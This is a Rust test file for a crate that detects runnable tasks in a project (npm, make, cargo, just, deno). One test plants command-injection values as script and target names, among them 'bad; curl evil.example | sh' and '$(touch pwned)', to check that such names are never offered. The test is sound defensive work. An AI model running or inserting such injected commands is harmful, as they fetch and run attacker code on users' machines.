//! Finding the tasks of a project on disk, with real-looking files in throwaway folders.

use std::fs;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicUsize, Ordering};

use termzip_tasks::{MAX_FILE_BYTES, MAX_TASKS, Task, detect};

static COUNTER: AtomicUsize = AtomicUsize::new(0);

/// A folder that is removed when the test ends.
struct Scratch(PathBuf);

impl Scratch {
    fn new() -> Self {
        let n = COUNTER.fetch_add(1, Ordering::Relaxed);
        let path = std::env::temp_dir().join(format!("termzip-tasks-{}-{n}", std::process::id()));
        let _ = fs::remove_dir_all(&path);
        fs::create_dir_all(&path).unwrap();
        Self(path)
    }

    fn dir(&self, relative: &str) -> PathBuf {
        let path = self.0.join(relative);
        fs::create_dir_all(&path).unwrap();
        path
    }

    fn write(&self, relative: &str, text: &str) {
        let path = self.0.join(relative);
        fs::create_dir_all(path.parent().unwrap()).unwrap();
        fs::write(path, text).unwrap();
    }

    /// Copies one of the real files in `tests/fixtures`.
    fn fixture(&self, name: &str, relative: &str) {
        let source = Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("tests/fixtures")
            .join(name);
        self.write(relative, &fs::read_to_string(source).unwrap());
    }
}

impl Drop for Scratch {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.0);
    }
}

fn commands(tasks: &[Task]) -> Vec<&str> {
    tasks.iter().map(|task| task.command.as_str()).collect()
}

#[test]
fn a_node_project_offers_its_scripts_with_the_manager_of_its_lock_file() {
    let scratch = Scratch::new();
    scratch.fixture("package.json", "package.json");
    scratch.write("pnpm-lock.yaml", "lockfileVersion: 9\n");

    let tasks = detect(&scratch.0);

    assert!(commands(&tasks).contains(&"pnpm run build"), "{tasks:?}");
    assert!(commands(&tasks).contains(&"pnpm run tauri"), "{tasks:?}");
    assert!(tasks.iter().all(|task| task.source == "package.json"));
}

#[test]
fn without_a_lock_file_it_is_npm_and_yarn_and_bun_are_recognized() {
    for (lock, manager) in [
        ("", "npm"),
        ("yarn.lock", "yarn"),
        ("bun.lockb", "bun"),
        ("package-lock.json", "npm"),
    ] {
        let scratch = Scratch::new();
        scratch.fixture("package.json", "package.json");
        if !lock.is_empty() {
            scratch.write(lock, "");
        }
        assert!(
            commands(&detect(&scratch.0)).contains(&format!("{manager} run dev").as_str()),
            "{lock}"
        );
    }
}

#[test]
fn the_package_manager_field_wins_over_a_lock_file() {
    let scratch = Scratch::new();
    scratch.write(
        "package.json",
        r#"{"packageManager": "yarn@4.1.0", "scripts": {"dev": "vite"}}"#,
    );
    scratch.write("package-lock.json", "{}");

    assert_eq!(commands(&detect(&scratch.0)), ["yarn run dev"]);
}

#[test]
fn from_a_subfolder_the_nearest_package_json_is_the_one_used() {
    let scratch = Scratch::new();
    scratch.write(".git/HEAD", "ref: refs/heads/main\n");
    scratch.write("package.json", r#"{"scripts": {"root-only": "x"}}"#);
    scratch.write("apps/web/package.json", r#"{"scripts": {"web": "x"}}"#);

    let from_app = detect(&scratch.dir("apps/web/src"));
    let from_root = detect(&scratch.0);

    assert_eq!(commands(&from_app), ["npm run web"]);
    assert_eq!(commands(&from_root), ["npm run root-only"]);
}

#[test]
fn a_file_above_the_repository_root_is_not_looked_at() {
    let scratch = Scratch::new();
    scratch.write("package.json", r#"{"scripts": {"outside": "x"}}"#);
    scratch.write("repo/.git/HEAD", "ref: refs/heads/main\n");
    scratch.write("repo/src/lib.rs", "");

    assert!(detect(&scratch.dir("repo/src")).is_empty());
}

#[test]
fn make_reads_only_the_makefile_of_the_current_folder() {
    let scratch = Scratch::new();
    scratch.write(".git/HEAD", "ref: refs/heads/main\n");
    scratch.fixture("Makefile", "Makefile");

    let here = detect(&scratch.0);
    let below = detect(&scratch.dir("sub"));

    assert_eq!(
        commands(&here),
        [
            "make all",
            "make build",
            "make test",
            "make lint",
            "make clean",
            "make install"
        ]
    );
    assert!(below.is_empty(), "{below:?}");
}

#[test]
fn cargo_offers_its_commands_and_the_aliases_of_the_config() {
    let scratch = Scratch::new();
    scratch.write(
        "Cargo.toml",
        "[package]\nname = \"x\"\nversion = \"0.1.0\"\n",
    );
    scratch.fixture("cargo-config.toml", ".cargo/config.toml");

    let tasks = detect(&scratch.0);
    let list = commands(&tasks);

    assert_eq!(
        &list[..6],
        [
            "cargo build",
            "cargo test",
            "cargo run",
            "cargo check",
            "cargo clippy",
            "cargo fmt"
        ]
    );
    // `b` and `xtask` are new; `test` is Cargo's own command and is not offered twice.
    assert_eq!(&list[6..], ["cargo b", "cargo xtask"]);
    assert!(tasks.iter().all(|task| task.source == "Cargo"));
}

#[test]
fn a_justfile_is_found_from_a_subfolder() {
    let scratch = Scratch::new();
    scratch.write(".git/HEAD", "ref: refs/heads/main\n");
    scratch.fixture("justfile", "justfile");

    let tasks = detect(&scratch.dir("crates/core"));

    assert_eq!(
        commands(&tasks),
        ["just build", "just test", "just release"]
    );
}

#[test]
fn deno_tasks_are_offered() {
    let scratch = Scratch::new();
    scratch.fixture("deno.json", "deno.json");

    assert_eq!(
        commands(&detect(&scratch.0)),
        ["deno task dev", "deno task test"]
    );
}

#[test]
fn several_kinds_of_project_come_in_a_fixed_order() {
    let scratch = Scratch::new();
    scratch.write("Cargo.toml", "[package]\nname = \"x\"\n");
    scratch.write("package.json", r#"{"scripts": {"web": "x"}}"#);
    scratch.fixture("justfile", "justfile");

    let sources: Vec<&str> = detect(&scratch.0).iter().map(|task| task.source).collect();
    let mut seen = Vec::new();
    for source in sources {
        if seen.last() != Some(&source) {
            seen.push(source);
        }
    }

    assert_eq!(seen, ["package.json", "Cargo", "justfile"]);
}

#[test]
fn a_name_that_could_run_something_else_is_never_offered() {
    let scratch = Scratch::new();
    scratch.write(
        "package.json",
        r#"{"scripts": {"ok": "x", "bad; curl evil.example | sh": "x", "$(touch pwned)": "x", "a b": "x"}}"#,
    );
    scratch.write("Makefile", "ok:\n\techo\nbad;rm: x\n`evil`:\n\techo\n");

    let tasks = detect(&scratch.0);

    assert_eq!(commands(&tasks), ["npm run ok", "make ok"]);
}

#[test]
fn a_file_that_is_too_big_is_not_read() {
    let scratch = Scratch::new();
    let padding = " ".repeat(MAX_FILE_BYTES as usize);
    scratch.write(
        "package.json",
        &format!(r#"{{"scripts": {{"dev": "x"}}}}{padding}"#),
    );

    assert!(detect(&scratch.0).is_empty());
}

#[test]
fn a_project_with_a_great_many_tasks_is_cut_at_the_limit() {
    let scratch = Scratch::new();
    let scripts: Vec<String> = (0..1000).map(|n| format!(r#""s{n}": "x""#)).collect();
    scratch.write(
        "package.json",
        &format!(r#"{{"scripts": {{{}}}}}"#, scripts.join(",")),
    );

    assert_eq!(detect(&scratch.0).len(), MAX_TASKS);
}

#[test]
fn a_folder_that_does_not_exist_has_no_tasks() {
    assert!(detect(Path::new("/definitely/not/here/at/all")).is_empty());
}

#[test]
fn a_directory_named_like_a_project_file_is_ignored() {
    let scratch = Scratch::new();
    scratch.dir("package.json");
    scratch.dir("Makefile");

    assert!(detect(&scratch.0).is_empty());
}

#[cfg(unix)]
#[test]
fn a_named_pipe_is_never_opened() {
    // Opening a pipe for reading waits for a writer for ever; the project file must be checked first.
    let scratch = Scratch::new();
    let status = std::process::Command::new("mkfifo")
        .arg(scratch.0.join("package.json"))
        .status();
    if !matches!(status, Ok(status) if status.success()) {
        return;
    }

    assert!(detect(&scratch.0).is_empty());
}
